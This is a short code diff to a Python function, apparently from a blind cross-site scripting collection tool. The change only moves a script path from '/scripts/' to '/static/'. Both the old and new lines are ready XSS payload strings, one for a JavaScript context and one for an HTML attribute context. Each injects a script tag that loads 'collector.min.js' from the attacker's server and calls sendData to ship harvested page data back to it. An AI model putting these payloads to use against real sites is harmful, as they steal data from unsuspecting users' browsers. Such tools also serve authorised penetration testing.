@@ -78,12 +78,12 @@ def xss_generate():
 
     if i_want_it_all:
         if code_type == "js":
-            payload = ';}};var js=document.createElement("script");js.src="{}/scripts/collector.min.js";js.onload=function(){{sendData("{}/api/x/{}/{}","{}")}};document.body.appendChild(js);'.format(
+            payload = ';}};var js=document.createElement("script");js.src="{}/static/collector.min.js";js.onload=function(){{sendData("{}/api/x/{}/{}","{}")}};document.body.appendChild(js);'.format(
                 url, url, xss_type, uid, other_data
             )
             return (payload), 200
         else:
-            payload = """'>"><script src={}/scripts/collector.min.js></script><script>sendData("{}/api/x/{}/{}", "{}")</script>""".format(
+            payload = """'>"><script src={}/static/collector.min.js></script><script>sendData("{}/api/x/{}/{}", "{}")</script>""".format(
                 url, url, xss_type, uid, other_data
             )
             return (payload), 200
